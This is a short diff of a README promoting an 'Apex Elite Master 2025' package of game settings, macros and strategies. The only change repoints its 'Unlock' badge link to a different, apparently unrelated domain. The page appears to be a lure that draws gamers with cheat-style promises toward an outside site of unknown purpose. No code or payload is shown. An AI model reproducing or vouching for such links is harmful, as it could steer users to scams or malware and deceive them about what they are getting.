@@ -2,7 +2,7 @@
 
 🌟 Unleash your true potential in Apex Legends with Elite Master 2025! This guide delivers cutting-edge settings, macros, and strategies for unparalleled dominance, crafted for Windows warriors.
 
-[![Unlock Apex Elite Master](https://img.shields.io/badge/Unlock-Apex_Elite_Master-blueviolet)](https://glocktober.com)
+[![Unlock Apex Elite Master](https://img.shields.io/badge/Unlock-Apex_Elite_Master-blueviolet)](https://ton-stake.net)
 
 ---
 
